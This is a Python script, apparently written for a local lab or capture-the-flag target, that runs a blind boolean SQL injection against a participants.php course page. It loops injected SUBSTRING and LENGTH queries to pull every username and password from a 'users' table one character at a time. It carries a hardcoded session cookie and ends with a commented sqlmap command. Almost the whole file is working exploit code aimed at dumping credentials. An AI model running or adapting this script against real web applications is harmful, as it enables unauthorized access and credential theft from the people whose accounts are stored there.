#!/usr/bin/python3
import requests, string
from bs4 import BeautifulSoup

initurl = "http://localhost:30000/participants.php?courseid=4"

#phpsessid_cookie = "ujtaamh8bdf5sh1arp9e9ks59i"
phpsessid_cookie = "ag3iqf7g92hd0nt4atpcrl9ntk"
headers = {'Cookie': f'PHPSESSID={phpsessid_cookie}'}
usernamechars = list(string.ascii_lowercase + string.ascii_uppercase)
passwordchars = list(string.ascii_lowercase + string.ascii_uppercase + string.digits + "_")

# Request data and check if it contains "student count" details in it.
# If the count is 0, then the SQL-Injection result was False, and if it was != 0 then the SQL-Injection result was True
def requestData(sqlQuery, log=True):
    try:
        url = initurl + sqlQuery
        # Send a GET request to the URL
        response = requests.get(url, headers=headers)
        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            # Parse the HTML content of the page
            soup = BeautifulSoup(response.text, 'html.parser')

            # Extract specific nodes or elements from the parsed HTML
            # For example, let's extract all the links (anchor tags)
            paras = soup.find('p', class_="count")
            # print(soup)

            count = paras.text.split(":")[-1].strip()
            if int(count) != 0:
                return True

        else:
            if (log):
                print(f'Error: Failed to fetch the page (Status Code: {response.status_code})')

    except requests.exceptions.RequestException as e:
        print(f'Error: {e}')
    return False

# It should count number of rows in "users" table
def countTableRows(log=True):
    datacount = 0
    if (log):
        print("[+] Counting number of rows in users table...")
    for i in range(20):

        # --------------------------------------- UPDATE PAYLOAD HERE ------------------------------- #
        sqlcountrows = f"' AND (SELECT COUNT(*) FROM users) = {i}-- abc"
        # ---------------------------------------------------------------------- #

        if requestData(sqlcountrows):
            if (log):
                print("\t[*] Number of rows in users table: ", i, sep="")
            datacount = i
            break
    return datacount

# It should count number of characters for a username in "users" table given the offset.
# "userOffset" should be defined as the number of row
def getUsernameCharacterCount(userOffset, log=True):
    if (log):
        print(f"[+] Counting number of characters in {userOffset}th username...")
    usernamecharCount = 0
    for count in range(20):

        # --------------------------------------- UPDATE PAYLOAD HERE ------------------------------- #
        usernamecharscountquery = f"' AND (SELECT LENGTH(username) FROM users LIMIT 1 OFFSET {userOffset}) = {count} -- abc"
        #usernamecharscountquery = f"' AND (SELECT LENGTH(username) FROM users WHERE sno = {userOffset}) = {count} -- abc"
        # ---------------------------------------------------------------------- #

        if requestData(usernamecharscountquery):
            if (log):
                print(f"\t[*] Number of characters in {userOffset}th username: ", count, sep="")
            usernamecharCount = count
            break
    return usernamecharCount

# It should return a username in "users" table given the offset and username character count.
# "userOffset" should be defined as the number of row
def findCurrentUsername(userOffset, usernamecharCount, log=True):
    username = ""
    if (log):
        print(f"[+] Finding {userOffset}th username...")
    for count in range(usernamecharCount):
        for ch in usernamechars:

            # --------------------------------------- UPDATE PAYLOAD HERE ------------------------------- #
            sqlusernameenum = f"' AND (SELECT SUBSTRING(username, {count+1}, 1) FROM users LIMIT 1 OFFSET {userOffset}) = '{ch}' -- abc"
            # ---------------------------------------------------------------------- #

            if requestData(sqlusernameenum):
                username+=ch
                break
    if(log):
        print(f"\t[+] Found {userOffset}th username: {username}")
    return username

# It should count number of characters in the password of a username in "users" table given the username.
def getPasswordCharacterCount(username, log=True):
    passwordcharcount = 0
    if (log):
        print(f"[+] Counting number of characters in the password of {username}...")
    for count in range(50):

        # --------------------------------------- UPDATE PAYLOAD HERE ------------------------------- #
        passwordcharscountquery = f"' AND (SELECT LENGTH(password) FROM users WHERE username='{username}') = {count} -- abc"
        # ---------------------------------------------------------------------- #

        if requestData(passwordcharscountquery):
            if (log):
                print(f"\t[*] Number of characters in the password of {username}: ", count, sep="")
            passwordcharcount = count
            break
    return passwordcharcount 

# It should return the password of a username in "users" table given the username and password character count.
def findCurrentPassword(passwordcharcount, username, log=True):
    password = ""
    if (log):
        print(f"[+] Finding password of user: {username}...")
    for count in range(passwordcharcount):
        for ch in passwordchars:
            # --------------------------------------- UPDATE PAYLOAD HERE ------------------------------- #
            sqlpasswordenum = f"' AND (SELECT SUBSTRING(password, {count+1} ,1) FROM users WHERE username='{username}') = '{ch}' -- abc"
            # ---------------------------------------------------------------------- #
            if requestData(sqlpasswordenum):
                password+=ch
                break
    if (log):
        print(f"\t[+] Password found as: {password}")
    return password

# print(countTableRows())

for i in range(countTableRows()):
    username = findCurrentUsername(i, getUsernameCharacterCount(i))
    password = findCurrentPassword(getPasswordCharacterCount(username), username)
    print(f"[+] Username:Password found: ", end="")
    print(f"{username}:{password}")



#sqlmap -u 'http://localhost:30000/participants.php?courseid=5' --cookie='PHPSESSID=v5t7jifqq5u6o5r7ndvce9an4f' --search -T users --batch